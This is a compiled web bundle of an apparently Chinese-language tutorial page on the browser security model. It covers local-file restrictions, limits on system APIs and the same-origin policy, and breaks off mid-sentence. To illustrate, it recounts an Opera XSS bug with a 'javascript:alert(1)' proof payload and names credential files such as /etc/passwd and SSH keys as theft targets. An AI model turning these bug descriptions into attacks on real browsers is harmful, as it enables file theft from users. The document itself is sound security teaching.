"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[195],{3905:(e,n,r)=>{r.d(n,{Zo:()=>p,kt:()=>m});var t=r(7294);function a(e,n,r){return n in e?Object.defineProperty(e,n,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[n]=r,e}function i(e,n){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);n&&(t=t.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),r.push.apply(r,t)}return r}function l(e){for(var n=1;n<arguments.length;n++){var r=null!=arguments[n]?arguments[n]:{};n%2?i(Object(r),!0).forEach((function(n){a(e,n,r[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):i(Object(r)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(r,n))}))}return e}function o(e,n){if(null==e)return{};var r,t,a=function(e,n){if(null==e)return{};var r,t,a={},i=Object.keys(e);for(t=0;t<i.length;t++)r=i[t],n.indexOf(r)>=0||(a[r]=e[r]);return a}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(t=0;t<i.length;t++)r=i[t],n.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(a[r]=e[r])}return a}var x=t.createContext({}),d=function(e){var n=t.useContext(x),r=n;return e&&(r="function"==typeof e?e(n):l(l({},n),e)),r},p=function(e){var n=d(e.components);return t.createElement(x.Provider,{value:n},e.children)},s="mdxType",u={inlineCode:"code",wrapper:function(e){var n=e.children;return t.createElement(t.Fragment,{},n)}},c=t.forwardRef((function(e,n){var r=e.components,a=e.mdxType,i=e.originalType,x=e.parentName,p=o(e,["components","mdxType","originalType","parentName"]),s=d(r),c=a,m=s["".concat(x,".").concat(c)]||s[c]||u[c]||i;return r?t.createElement(m,l(l({ref:n},p),{},{components:r})):t.createElement(m,l({ref:n},p))}));function m(e,n){var r=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var i=r.length,l=new Array(i);l[0]=c;var o={};for(var x in n)hasOwnProperty.call(n,x)&&(o[x]=n[x]);o.originalType=e,o[s]="string"==typeof e?e:a,l[1]=o;for(var d=2;d<i;d++)l[d]=r[d];return t.createElement.apply(null,l)}return t.createElement.apply(null,r)}c.displayName="MDXCreateElement"},2662:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>x,contentTitle:()=>l,default:()=>u,frontMatter:()=>i,metadata:()=>o,toc:()=>d});var t=r(7462),a=(r(7294),r(3905));const i={sidebar_position:2,title:"\u700f\u89bd\u5668\u7684\u5b89\u5168\u6a21\u578b"},l="\u700f\u89bd\u5668\u7684\u5b89\u5168\u6a21\u578b",o={unversionedId:"ch1/browser-security-model",id:"ch1/browser-security-model",title:"\u700f\u89bd\u5668\u7684\u5b89\u5168\u6a21\u578b",description:"\u5728\u8ac7\u7db2\u9801\u524d\u7aef\u7684\u8cc7\u5b89\u8b70\u984c\u6642\uff0c\u6211\u5011\u5fc5\u9808\u5148\u5c0d\u7db2\u9801\u524d\u7aef\u7684\u6838\u5fc3\u6709\u500b\u6700\u57fa\u790e\u7684\u8a8d\u8b58\u3002",source:"@site/docs/ch1/02-browser-security-model.md",sourceDirName:"ch1",slug:"/ch1/browser-security-model",permalink:"/beyond-xss/ch1/browser-security-model",draft:!1,tags:[],version:"current",sidebarPosition:2,frontMatter:{sidebar_position:2,title:"\u700f\u89bd\u5668\u7684\u5b89\u5168\u6a21\u578b"},sidebar:"tutorialSidebar",previous:{title:"\u95dc\u65bc\u672c\u7cfb\u5217",permalink:"/beyond-xss/"},next:{title:"\u524d\u7aef\u8cc7\u5b89\u9084\u662f\u5f97\u5f9e XSS \u958b\u59cb\u8ac7\u8d77\u624d\u5c0d\u5473",permalink:"/beyond-xss/ch1/xss-introduction"}},x={},d=[{value:"\u7981\u6b62\u4e3b\u52d5\u8b80\u5beb\u672c\u6a5f\u7684\u6a94\u6848",id:"\u7981\u6b62\u4e3b\u52d5\u8b80\u5beb\u672c\u6a5f\u7684\u6a94\u6848",level:2},{value:"\u7981\u6b62\u547c\u53eb\u7cfb\u7d71 API",id:"\u7981\u6b62\u547c\u53eb\u7cfb\u7d71-api",level:2},{value:"\u7981\u6b62\u5b58\u53d6\u5176\u4ed6\u7db2\u9801\u7684\u5167\u5bb9",id:"\u7981\u6b62\u5b58\u53d6\u5176\u4ed6\u7db2\u9801\u7684\u5167\u5bb9",level:2},{value:"\u5c0f\u7d50",id:"\u5c0f\u7d50",level:2}],p={toc:d},s="wrapper";function u(e){let{components:n,...i}=e;return(0,a.kt)(s,(0,t.Z)({},p,i,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"\u700f\u89bd\u5668\u7684\u5b89\u5168\u6a21\u578b"},"\u700f\u89bd\u5668\u7684\u5b89\u5168\u6a21\u578b"),(0,a.kt)("p",null,"\u5728\u8ac7\u7db2\u9801\u524d\u7aef\u7684\u8cc7\u5b89\u8b70\u984c\u6642\uff0c\u6211\u5011\u5fc5\u9808\u5148\u5c0d\u7db2\u9801\u524d\u7aef\u7684\u6838\u5fc3\u6709\u500b\u6700\u57fa\u790e\u7684\u8a8d\u8b58\u3002"),(0,a.kt)("p",null,"\u7db2\u9801\u524d\u7aef\u6700\u5927\u7684\u4e0d\u540c\uff0c\u5c31\u5728\u65bc\u7a0b\u5f0f\u78bc\u662f\u8dd1\u5728\u700f\u89bd\u5668\u4e0a\u9762\u3002\u662f\u700f\u89bd\u5668\u8ca0\u8cac render \u4f60\u7684 HTML\uff0c\u662f\u700f\u89bd\u5668\u8ca0\u8cac\u89e3\u6790\u4f60\u7684 CSS \u4e26\u4e14\u7e6a\u88fd\u51fa\u4f86\uff0c\u4e5f\u662f\u700f\u89bd\u5668\u8ca0\u8cac\u57f7\u884c\u9801\u9762\u4e0a\u7684 JavaScript \u7a0b\u5f0f\u78bc\u3002"),(0,a.kt)("p",null,"\u4ee5\u7db2\u9801\u524d\u7aef\u4f86\u8aaa\uff0c\u5b83\u7684\u57f7\u884c\u74b0\u5883\u5c31\u662f\u700f\u89bd\u5668\u3002"),(0,a.kt)("p",null,"\u4ee5\u4e0b\u5716\u70ba\u4f8b\uff0c\u6700\u5916\u5c64\u7684\u4e00\u5708\u9ed1\u8272\u7684\u662f\u4f5c\u696d\u7cfb\u7d71\uff0c\u800c\u5169\u500b\u7da0\u8272\u7684\u61c9\u7528\u7a0b\u5f0f\u662f\u8dd1\u5728\u4f5c\u696d\u7cfb\u7d71\u4e0a\u9762\uff0c\u53f3\u908a\u7684\u4ee3\u8868\u7684\u662f\u700f\u89bd\u5668\uff0c\u800c\u7db2\u9801\u524d\u7aef\u53c8\u662f\u8dd1\u5728\u700f\u89bd\u5668\u4e0a\u9762\uff0c\u8d8a\u5167\u5c64\u7684\u9650\u5236\u7406\u6240\u7576\u7136\u4e5f\u8d8a\u591a\uff1a"),(0,a.kt)("p",null,(0,a.kt)("img",{src:r(6395).Z,width:"1032",height:"573"})),(0,a.kt)("p",null,"\u5fc5\u9808\u8a18\u4f4f\u9019\u9ede\uff0c\u624d\u80fd\u77e5\u9053\u70ba\u4ec0\u9ebc\u6709\u4e9b\u4e8b\u60c5\u7db2\u9801\u524d\u7aef\u505a\u4e0d\u5230\uff0c\u4e0d\u662f\u6211\u4e0d\u60f3\u505a\uff0c\u800c\u662f\u700f\u89bd\u5668\u4e0d\u8b93\u6211\u505a\u3002\u8209\u4f8b\u4f86\u8aaa\uff0c\u5f8c\u7aef\u4f3a\u670d\u5668\u53ef\u4ee5\u8f15\u9b06\u57f7\u884c\u6a94\u6848\u8b80\u5beb\u7684\u64cd\u4f5c\uff0c\u4f46\u662f\u7db2\u9801\u524d\u7aef\u537b\u4e0d\u4e00\u5b9a\u505a\u5f97\u5230\uff0c\u9019\u662f\u70ba\u4ec0\u9ebc\uff1f\u56e0\u70ba\u700f\u89bd\u5668\u4e0d\u8b93\u6211\u5011\u505a\u3002"),(0,a.kt)("p",null,"\u70ba\u4ec0\u9ebc\u6211\u770b\u5225\u4eba\u5beb\u5f8c\u7aef\u90fd\u53ef\u4ee5\uff3f\uff3f\uff08\u8acb\u81ea\u884c\u586b\u5165\uff09\uff0c\u4f46\u662f\u6211\u5728\u524d\u7aef\u7684\u6642\u5019\u597d\u50cf\u6c92\u6709\u67e5\u5230\u505a\u6cd5\uff1f\u9019\u4e5f\u5f88\u6709\u53ef\u80fd\u662f\u56e0\u70ba\u700f\u89bd\u5668\u4e0d\u8b93\u4f60\u9019\u6a23\u505a\u3002"),(0,a.kt)("p",null,"\u7528\u4e00\u53e5\u8a71\u7e3d\u7d50\u5c31\u662f\uff1a"),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"},"\u700f\u89bd\u5668\u4e0d\u7d66\u4f60\u7684\uff0c\u4f60\u62ff\u4e0d\u5230\uff0c\u62ff\u4e0d\u5230\u5c31\u662f\u62ff\u4e0d\u5230")),(0,a.kt)("p",null,"\u90a3\u5230\u5e95\u700f\u89bd\u5668\u505a\u4e86\u54ea\u4e9b\u5b89\u5168\u9650\u5236\uff1f\u5b83\u5230\u5e95\u9650\u5236\u4e86\u54ea\u4e9b\u6771\u897f\uff1f\u4ee5\u4e0b\u8209\u5e7e\u500b\u4f8b\u5b50\u3002"),(0,a.kt)("h2",{id:"\u7981\u6b62\u4e3b\u52d5\u8b80\u5beb\u672c\u6a5f\u7684\u6a94\u6848"},"\u7981\u6b62\u4e3b\u52d5\u8b80\u5beb\u672c\u6a5f\u7684\u6a94\u6848"),(0,a.kt)("p",null,"\u4ee5\u5f8c\u7aef\u4f86\u8aaa\uff0c\u5b83\u7684\u7a0b\u5f0f\u78bc\u662f\u76f4\u63a5\u8dd1\u5728\u4f5c\u696d\u7cfb\u7d71\u4e0a\u9762\uff0c\u7b49\u65bc\u8aaa\u5c31\u662f\u4e00\u500b\u4e00\u822c\u7684\u61c9\u7528\u7a0b\u5f0f\uff0c\u5982\u679c\u6c92\u6709\u7279\u5225\u9650\u5236\u6b0a\u9650\u7684\u8a71\uff0c\u57fa\u672c\u4e0a\u60f3\u5e79\u561b\u5c31\u5e79\u561b\uff0c\u6574\u53f0\u6a5f\u5668\u90fd\u662f\u5b83\u7684\u904a\u6a02\u5834\u3002"),(0,a.kt)("p",null,"\u4f46\u524d\u7aef\u7684\u9650\u5236\u53ef\u5c31\u591a\u4e86\uff0c\u4f8b\u5982\u8aaa\u4e0d\u80fd\u300c\u4e3b\u52d5\u300d\u53bb\u8b80\u5beb\u96fb\u8166\u88e1\u9762\u7684\u6a94\u6848\u3002\u5148\u4f86\u8b1b\u600e\u6a23\u662f\u53ef\u4ee5\u7684\uff0c\u53ef\u4ee5\u900f\u904e ",(0,a.kt)("inlineCode",{parentName:"p"},"<input type=file>")," \u8b93\u4f7f\u7528\u8005\u9078\u64c7\u6a94\u6848\uff0c\u9078\u5b8c\u4ee5\u5f8c\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},"FileReader")," \u628a\u6a94\u6848\u5167\u5bb9\u8b80\u51fa\u4f86\uff0c\u50cf\u662f\u9019\u6a23\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<input type="file" onchange="show(this)">\n\n<script>\nfunction show(input) {\n  const reader = new FileReader();\n  reader.onload = (event) => {\n    alert(event.target.result);\n  };\n  reader.readAsText(input.files[0]);\n  \n}\n<\/script>\n')),(0,a.kt)("p",null,"\u4f46\u662f\u6c92\u8fa6\u6cd5\u76f4\u63a5\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},"fetch('file:///data/index.html')")," \u4e4b\u985e\u7684\u64cd\u4f5c\u53bb\u8b80\u53d6\u6a94\u6848\uff0c\u5982\u679c\u9019\u6a23\u505a\u4e86\uff0c\u53ea\u6703\u5728 console \u88e1\u9762\u770b\u898b\u932f\u8aa4\uff1a"),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"},"Not allowed to load local resource: file:///data/index.html")),(0,a.kt)("p",null,"\u5c31\u7b97\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},"window.open('file:///data/index.html')")," \u4e5f\u4e00\u6a23\uff0c\u90fd\u6703\u770b\u5230\u540c\u6a23\u7684\u932f\u8aa4\u3002"),(0,a.kt)("p",null,"\u700f\u89bd\u5668\u4e4b\u6240\u4ee5\u6703\u6709\u9650\u5236\uff0c\u7d55\u5c0d\u90fd\u662f\u6709\u539f\u56e0\u7684\u3002\u5982\u679c\u53ef\u4ee5\u8b93\u524d\u7aef\u7db2\u9801\u76f4\u63a5\u4e3b\u52d5\u8b80\u53d6\u6a94\u6848\uff0c\u6703\u767c\u751f\u4ec0\u9ebc\u4e8b\uff1f\u6211\u5c31\u53ef\u4ee5\u76f4\u63a5\u8b80\u53d6\u4f60\u7684 ",(0,a.kt)("inlineCode",{parentName:"p"},"/etc/passwd"),"\uff0c\u8b80\u53d6\u4f60\u7684 SSH key\uff0c\u8b80\u4f60\u7684\u8a2d\u5b9a\u6a94\u8ddf\u5404\u7a2e\u542b\u6709\u654f\u611f\u8cc7\u8a0a\u7684\u6a94\u6848\uff0c\u751a\u81f3\u60f3\u8fa6\u6cd5\u5728\u4f60\u96fb\u8166\u88e1\u9762\u627e\u5230\u52a0\u5bc6\u8ca8\u5e63\u9322\u5305\u7684\u5099\u4efd\u52a9\u8a18\u8a5e\uff0c\u9019\u554f\u984c\u53ef\u5c31\u5927\u4e86\uff0c\u8ddf\u88ab\u6728\u99ac\u8edf\u9ad4\u5165\u4fb5\u5dee\u4e0d\u591a\u3002"),(0,a.kt)("p",null,"\u6240\u4ee5\uff0c\u7981\u6b62 JavaScript \u4e3b\u52d5\u8b80\u53d6\u6a94\u6848\u662f\u975e\u5e38\u5408\u7406\u7684\u4e8b\u60c5\uff0c\u5426\u5247\u53ea\u8981\u958b\u500b\u7db2\u9801\uff0c\u6240\u6709\u7684\u6a94\u6848\u5167\u5bb9\u5c31\u88ab\u770b\u5149\u5149\u4e86\uff0c\u6703\u6709\u6975\u5927\u7684\u8cc7\u5b89\u554f\u984c\u3002"),(0,a.kt)("p",null,"\u800c\u9019\u7a2e\u4e8b\u60c5\u5176\u5be6\u4ee5\u524d\u66fe\u7d93\u767c\u751f\u904e\uff0c\u8b93\u6211\u5011\u4f86\u770b\u500b\u6848\u4f8b\u3002"),(0,a.kt)("p",null,"\u5728 2021 \u5e74\u6642\uff0cRenwa \u5411 Opera \u56de\u5831\u7684\u4e00\u500b\u6f0f\u6d1e\uff1a",(0,a.kt)("a",{parentName:"p",href:"https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser/"},"Bug Bounty Guest Post: Local File Read via Stored XSS in The Opera Browser"),"\uff0c\u5c31\u6b63\u597d\u662f\u5229\u7528\u700f\u89bd\u5668\u7684\u6f0f\u6d1e\u53bb\u8b80\u53d6\u6a94\u6848\u3002"),(0,a.kt)("p",null,"Opera \u662f\u4ee5 Chromium \u70ba\u57fa\u790e\u6253\u9020\u7684\u700f\u89bd\u5668\uff0c\u800c\u5176\u4e2d\u6709\u4e00\u500b\u300cOpera Pinboards\u300d\u7684\u529f\u80fd\uff0c\u53ef\u4ee5\u5efa\u7acb\u4e00\u4e9b\u7b46\u8a18\u7136\u5f8c\u5206\u4eab\u7d66\u5176\u4ed6\u4f7f\u7528\u8005\uff0c\u800c\u7b46\u8a18\u9801\u9762\u7684\u7db2\u5740\u662f\uff1a",(0,a.kt)("inlineCode",{parentName:"p"},"opera:pinboards"),"\uff0c\u662f\u5c6c\u65bc\u7279\u6b8a\u7684\u5354\u5b9a\uff0c\u901a\u5e38\u6703\u7d66\u4e88\u4e00\u4e9b\u7279\u5225\u7684\u6b0a\u9650\u3002"),(0,a.kt)("p",null,"\u5728\u5efa\u7acb\u7b46\u8a18\u7684\u6642\u5019\uff0c\u53ef\u4ee5\u5305\u542b\u4e00\u500b\u9023\u7d50\uff0c\u4f8b\u5982\u8aaa\uff1a",(0,a.kt)("inlineCode",{parentName:"p"},"https://blog.huli.tw"),"\uff0c\u800c Renwa \u767c\u73fe\u4e86\u9664\u4e86\u53ef\u4ee5\u4f7f\u7528\u6b63\u5e38\u7684\u9023\u7d50\u4ee5\u5916\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},"javascript:alert(1)")," \u9019\u7a2e\u985e\u578b\u7684\u9023\u7d50\u53bb\u57f7\u884c\u7a0b\u5f0f\u78bc\uff0c\u56e0\u6b64\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u500b ",(0,a.kt)("inlineCode",{parentName:"p"},"opera:pinboards")," \u5e95\u4e0b\u7684 XSS \u6f0f\u6d1e\uff01"),(0,a.kt)("p",null,"\u524d\u9762\u6709\u63d0\u904e\u5728 ",(0,a.kt)("inlineCode",{parentName:"p"},"opera:")," \u5e95\u4e0b\u6703\u6709\u4e00\u4e9b\u7279\u6b8a\u7684\u6b0a\u9650\uff0c\u4f8b\u5982\u8aaa\u53ef\u4ee5\u958b\u555f ",(0,a.kt)("inlineCode",{parentName:"p"},"file://")," \u7684\u7db2\u9801\uff0c\u9084\u53ef\u4ee5\u5e6b\u7db2\u9801\u622a\u5716\u4e26\u5f97\u5230\u622a\u5716\u7684\u7d50\u679c\uff0c\u56e0\u6b64\u5c31\u53ef\u4ee5\u5229\u7528\u525b\u525b\u8b1b\u7684 XSS \u53bb\u958b\u555f\u672c\u6a5f\u7684\u6a94\u6848\u4e26\u4e14\u622a\u5716\uff0c\u50b3\u5230\u653b\u64ca\u8005\u7684\u4f3a\u670d\u5668\uff0c\u9054\u6210\u5077\u53d6\u6a94\u6848\u7684\u76ee\u7684\u3002"),(0,a.kt)("p",null,"\u800c\u9019\u500b bug \u5728\u56de\u5831\u5f8c\u7684\u4e00\u5929\u4e4b\u5167\u5c31\u88ab\u4fee\u6389\u4e86\uff0c\u56de\u5831\u8005\u4e5f\u5f97\u5230\u734e\u91d1 4000 \u7f8e\u91d1\u3002"),(0,a.kt)("h2",{id:"\u7981\u6b62\u547c\u53eb\u7cfb\u7d71-api"},"\u7981\u6b62\u547c\u53eb\u7cfb\u7d71 API"),(0,a.kt)("p",null,"\u4e00\u822c\u7684\u61c9\u7528\u7a0b\u5f0f\u53ef\u4ee5\u505a\u5f88\u591a\u4e8b\u60c5\uff0c\u4f8b\u5982\u8aaa\u66f4\u6539\u7cfb\u7d71\u8a2d\u5b9a\u6216\u662f\u7db2\u8def\u8a2d\u5b9a\u7b49\u7b49\uff0c\u53ef\u4ee5\u900f\u904e\u7cfb\u7d71\u6240\u63d0\u4f9b\u7684 API \u9032\u884c\u5f88\u591a\u64cd\u4f5c\uff0c\u4f46\u662f\u9019\u4e9b JavaScript \u90fd\u505a\u4e0d\u5230\u3002"),(0,a.kt)("p",null,"\u6216\u662f\u8b1b\u5f97\u66f4\u7cbe\u78ba\u4e00\u9ede\uff0c\u5176\u5be6\u4e0d\u662f JavaScript \u672c\u8eab\u505a\u4e0d\u5230\uff0c\u5b83\u53ea\u662f\u500b\u7a0b\u5f0f\u8a9e\u8a00\u800c\u5df2\uff0c\u800c\u662f\u300c\u700f\u89bd\u5668\u6c92\u6709\u63d0\u4f9b\u7d66\u7db2\u9801\u524d\u7aef\u76f8\u5c0d\u61c9\u7684 API\uff0c\u6240\u4ee5\u505a\u4e0d\u5230\u300d\u3002"),(0,a.kt)("p",null,"\u7576\u6211\u5011\u5728\u7db2\u9801\u524d\u7aef\u57f7\u884c JavaScript \u6642\uff0c\u6211\u5011\u53ea\u80fd\u4f7f\u7528\u700f\u89bd\u5668\u63d0\u4f9b\u7d66\u6211\u5011\u7684\u6771\u897f\uff0c\u4f8b\u5982\u8aaa\u6211\u5011\u53ef\u4ee5\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},"fetch()")," \u53bb\u767c\u51fa\u4e00\u500b request\uff0c\u53ef\u4ee5\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},"setTimeout")," \u8a2d\u5b9a\u4e00\u500b\u8a08\u6642\u5668\u7b49\u7b49\uff0c\u9019\u4e9b\u90fd\u662f\u700f\u89bd\u5668\u6240\u63d0\u4f9b\u7684\u4ecb\u9762\uff0c\u8b93\u6211\u5011\u53ef\u4ee5\u53bb\u4f7f\u7528\u3002"),(0,a.kt)("p",null,"\u5982\u679c\u60f3\u8981\u4f7f\u7528\u7cfb\u7d71\u7684 API\uff0c\u9664\u975e\u700f\u89bd\u5668\u4e5f\u6709\u63d0\u4f9b\u76f8\u5c0d\u61c9\u7684\u4ecb\u9762\uff0c\u5426\u5247\u7db2\u9801\u4e0a\u7684 JavaScript \u662f\u7121\u6cd5\u4f7f\u7528\u90a3\u4e9b\u529f\u80fd\u7684\u3002"),(0,a.kt)("p",null,"\u8209\u4f8b\u4f86\u8aaa\uff0c\u700f\u89bd\u5668\u6709\u63d0\u4f9b\u8207\u85cd\u82bd\u8a2d\u5099\u6e9d\u901a\u7684 API\uff1aWeb Bluetooth API\uff0c\u56e0\u6b64\u5728\u7db2\u9801\u4e0a\u7684 JavaScript \u5176\u5be6\u53ef\u4ee5\u505a\u51fa\u8ddf\u85cd\u82bd\u6709\u95dc\u7684\u61c9\u7528\uff1b\u800c\u53e6\u4e00\u500b MediaDevices API \u5247\u662f\u8b93 JavaScript \u53ef\u4ee5\u53d6\u5f97\u50cf\u662f\u9ea5\u514b\u98a8\u8207\u651d\u5f71\u6a5f\u7b49\u7b49\u7684\u8cc7\u6599\uff0c\u6240\u4ee5\u4e5f\u53ef\u4ee5\u505a\u51fa\u76f8\u95dc\u61c9\u7528\u3002"),(0,a.kt)("p",null,"\u800c\u700f\u89bd\u5668\u5728\u63d0\u4f9b\u9019\u4e9b API \u7684\u6642\u5019\uff0c\u540c\u6642\u4e5f\u6703\u5be6\u4f5c\u6b0a\u9650\u7ba1\u7406\u7684\u6a5f\u5236\uff0c\u901a\u5e38\u6703\u8df3\u51fa\u901a\u77e5\u8981\u6c42\u4f7f\u7528\u8005\u4e3b\u52d5\u540c\u610f\u4e26\u5141\u8a31\u8a72\u6b0a\u9650\uff0c\u624d\u6703\u8b93\u7db2\u9801\u80fd\u5920\u62ff\u5f97\u5230\u6771\u897f\u3002"),(0,a.kt)("h2",{id:"\u7981\u6b62\u5b58\u53d6\u5176\u4ed6\u7db2\u9801\u7684\u5167\u5bb9"},"\u7981\u6b62\u5b58\u53d6\u5176\u4ed6\u7db2\u9801\u7684\u5167\u5bb9"),(0,a.kt)("p",null,"\u9019\u53ef\u4ee5\u7b97\u662f\u700f\u89bd\u5668\u6700\u91cd\u8981\u7684\u4e00\u500b\u5b89\u5168\u5047\u8a2d\u4e86\uff0c\u4e00\u500b\u7db2\u9801\u6c38\u9060\u4e0d\u8a72\u6709\u6b0a\u9650\u5b58\u53d6\u5230\u5176\u4ed6\u7db2\u9801\u7684\u5167\u5bb9\uff0c\u9019\u9ede\u61c9\u8a72\u4e5f\u5f88\u597d\u7406\u89e3\uff0c\u5982\u679c\u9055\u53cd\u9019\u9ede\u7684\u8a71\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u5f9e ",(0,a.kt)("inlineCode",{parentName:"p"},"blog.huli.tw")," \u53bb\u8b80\u53d6\u5728 ",(0,a.kt)("inlineCode",{parentName:"p"},"mail.google.com")," \u7684\u4fe1\u4ef6\u4e86\uff0c\u9019\u986f\u7136\u4e0d\u5b89\u5168\u561b\u3002"),(0,a.kt)("p",null,"\u56e0\u6b64\uff0c\u6bcf\u500b\u7db2\u9801\u90fd\u53ea\u6709\u91dd\u5c0d\u81ea\u5df1\u7684\u6b0a\u9650\uff0c\u53ef\u4ee5\u6539\u81ea\u5df1\u7684 HTML\uff0c\u57f7\u884c\u60f3\u8981\u7684 JavaScript \u7a0b\u5f0f\u78bc\uff0c\u4f46\u4e0d\u8a72\u62ff\u5230\u5176\u4ed6\u7db2\u9801\u7684\u8cc7\u6599\uff0c\u9019\u5c31\u53eb\u505a\u540c\u6e90\u653f\u7b56\uff08same-origin policy\uff0c\u6709\u6642\u88ab\u7c21\u7a31\u70ba SOP\uff09\u3002"),(0,a.kt)("p",null,"\u800c\u4e14\u9019\u500b\u300c\u8cc7\u6599\u300d\u5176\u5be6\u4e0d\u53ea\u6709\u300c\u9801\u9762\u4e0a\u7684\u5167\u5bb9\u300d\u800c\u5df2\uff0c\u751a\u81f3\u662f\u9023\u300c\u5225\u7684\u9801\u9762\u7684\u7db2\u5740\u300d\u90fd\u62ff\u4e0d\u5230\u3002"),(0,a.kt)("p",null,"\u8209\u4f8b\u4f86\u8aaa\uff0c\u5047\u8a2d\u5728 ",(0,a.kt)("inlineCode",{parentName:"p"},"github.com")," \u57f7\u884c\u4e86\u4ee5\u4e0b\u7684\u7a0b\u5f0f\u78bc\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},"var win = window.open('https://blog.huli.tw')\nsetTimeout(() => {\n  console.log(win.location.href)\n}, 3000)\n")),(0,a.kt)("p",null,"\u6703\u770b\u5230\u4e0b\u5716\u7684\u932f\u8aa4\u8a0a\u606f\uff1a"),(0,a.kt)("p",null,(0,a.kt)("img",{src:r(1273).Z,width:"860",height:"235"})),(0,a.kt)("p",null,"\u4e0a\u9762\u5beb\u8457\uff1a"),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"},'Uncaught DOMException: Blocked a frame with origin "',(0,a.kt)("a",{parentName:"p",href:"https://github.com%22"},'https://github.com"')," from accessing a cross-origin frame.")),(0,a.kt)("p",null,"\u610f\u601d\u5c31\u662f\u4f60\u6c92\u8fa6\u6cd5\u5b58\u53d6\u5176\u4ed6\u9801\u9762\u4e0a\u7684\u6771\u897f\uff0c\u5305\u62ec\u7db2\u5740\u4e5f\u4e0d\u884c\u3002"),(0,a.kt)("p",null,"\u96d6\u7136\u8aaa\u9019\u9ede\u770b\u8d77\u4f86\u975e\u5e38\u57fa\u672c\u800c\u4e14\u4e5f\u5f88\u5fc5\u8981\uff0c\u4f46\u5176\u5be6\u700f\u89bd\u5668\u8981\u5be6\u4f5c\u51fa\u9019\u500b\u529f\u80fd\u4e26\u6c92\u6709\u9019\u9ebc\u5bb9\u6613\u3002\u700f\u89bd\u5668\u4e5f\u662f\u7d93\u6b77\u4e86\u8a31\u591a\u6b21\u7684\u653b\u64ca\uff0c\u52a0\u4e0a\u5f88\u591a\u9632\u79a6\u63aa\u65bd\u4ee5\u53ca\u8abf\u6574\u67b6\u69cb\u4ee5\u5f8c\uff0c\u624d\u8b93\u81ea\u5df1\u6108\u4f86\u6108\u5b89\u5168\uff0c\u6108\u80fd\u7b26\u5408\u9019\u500b\u5b89\u5168\u7684\u8981\u6c42\u3002"),(0,a.kt)("p",null,"\u8209\u4f8b\u4f86\u8aaa\uff0c2018 \u5e74\u7684 1 \u6708\uff0cGoogle \u7684 Project Zeror \u5c0d\u5916\u767c\u8868\u4e86\u6b77\u53f2\u7d1a\u7684\u91cd\u5927\u6f0f\u6d1e\uff1aMeltdown \u8207 Spectre\uff0c\u53ef\u4ee5\u900f\u904e CPU \u7684\u7f3a\u9677\u4f86\u8b80\u5230\u540c\u4e00\u500b process \u7684\u8cc7\u6599\u3002"),(0,a.kt)("p",null,"\u800c Chrome \u700f\u89bd\u5668\u5c31\u56e0\u61c9\u4e86\u9019\u500b\u6f0f\u6d1e\uff0c\u5c07\u81ea\u5df1\u7684\u67b6\u69cb\u8abf\u6574\u5f97\u66f4\u5b89\u5168\uff0c\u78ba\u4fdd\u4e0d\u540c \u7684\u7db2\u9801\u7121\u8ad6\u662f\u4f7f\u7528\u4ec0\u9ebc\u65b9\u5f0f\u8f09\u5165\uff08\u5305\u542b\u5716\u7247\u4ee5\u53ca iframe \u7b49\u7b49\uff09\uff0c\u90fd\u6703\u4f7f\u7528\u4e0d\u540c\u7684 process \u53bb\u8655\u7406\uff0c\u9019\u4e00\u7cfb\u5217\u7684\u5b89\u5168\u63aa\u65bd\u88ab\u7a31\u70ba Site Isolation\uff0c\u5728 ",(0,a.kt)("a",{parentName:"p",href:"https://www.chromium.org/Home/chromium-security/site-isolation/"},"Chromium \u7684\u7db2\u9801"),"\u4e0a\u6709\u66f4\u591a\u8a73\u7d30\u7684\u89e3\u91cb\uff0c\u4e4b\u5f8c\u7684\u6587\u7ae0\u4e2d\u4e5f\u6703\u518d\u6b21\u63d0\u5230\u3002"),(0,a.kt)("p",null,"\u91dd\u5c0d\u300c\u6c92\u8fa6\u6cd5\u5b58\u53d6\u5176\u4ed6\u9801\u9762\u4e0a\u7684\u6771\u897f\u300d\u7684\u9019\u9ede\uff0c\u6211\u5011\u4f86\u770b\u4e00\u500b\u7e5e\u904e\u7684\u7bc4\u4f8b\u3002"),(0,a.kt)("p",null,"\u5728 2022 \u5e74\u6642\uff0cjoaxcar \u5411 Chromium \u56de\u5831\u4e86\u4e00\u500b\u6f0f\u6d1e\uff1a",(0,a.kt)("a",{parentName:"p",href:"https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&q=subdomain%20host%20leak&can=1"},"Issue 1359122: Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank"),"\uff0c\u53ef\u4ee5\u5229\u7528\u4e00\u500b iframe \u7684\u6f0f\u6d1e\u8b80\u5230 cross-origin \u7684\u7db2\u5740\u3002"),(0,a.kt)("p",null,"\u5047\u8a2d\u73fe\u5728\u7db2\u9801\u662f ",(0,a.kt)("inlineCode",{parentName:"p"},"a.example.com"),"\uff0c\u88e1\u9762\u6709\u4e00\u500b iframe \u7684\u7db2\u5740\u662f 